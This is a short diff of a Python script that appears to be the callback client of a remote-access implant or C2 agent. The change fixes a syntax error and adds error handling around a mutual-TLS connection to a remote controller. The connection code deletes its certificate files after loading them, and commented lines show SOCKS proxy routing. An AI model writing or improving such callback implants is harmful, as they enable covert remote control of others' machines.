@@ -14,7 +14,7 @@ from getpass import getuser
 import argparse,base64
 
 #set working directory to script location
-chdir(path.dirname(os.path.realpath(__file__))
+chdir(path.dirname(path.realpath(__file__)))
 
 #IGNORE SSL CHECKS
 
@@ -331,19 +331,24 @@ def callback_port(conn,data):
 def connect(remote_ip=remote_ip, remote_port=remote_port):
     global RECONNECT_ATTEMPTS
     data = ""
-    context = create_default_context(Purpose.SERVER_AUTH, cafile='server_cert')
-    context.check_hostname = False
-    context.load_cert_chain(certfile='client_cert', keyfile='client_key')
-    delete_keys()
-    s = socket(AF_INET, SOCK_STREAM)
-    #s.setblocking(0)
-    x = s.getsockopt( SOL_SOCKET, SO_KEEPALIVE)
-    
-    #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
-    #socket.socket = socks.socksocket
-    #s = socks.socksocket()
-    conn = context.wrap_socket(s, server_side=False)
+    try:
+        context = create_default_context(Purpose.SERVER_AUTH, cafile='server_cert')
+        context.check_hostname = False
+        context.load_cert_chain(certfile='client_cert', keyfile='client_key')
+        delete_keys()
+        s = socket(AF_INET, SOCK_STREAM)
+        #s.setblocking(0)
+        x = s.getsockopt( SOL_SOCKET, SO_KEEPALIVE)
+        
+        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
+        #socket.socket = socks.socksocket
+        #s = socks.socksocket()
+        conn = context.wrap_socket(s, server_side=False)
+    except Exception as e:
+        if DEBUG:
+            print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
     try:
         if VERBOSE:
             print_info("Trying to connect --> {}:{}".format(remote_ip,remote_port))
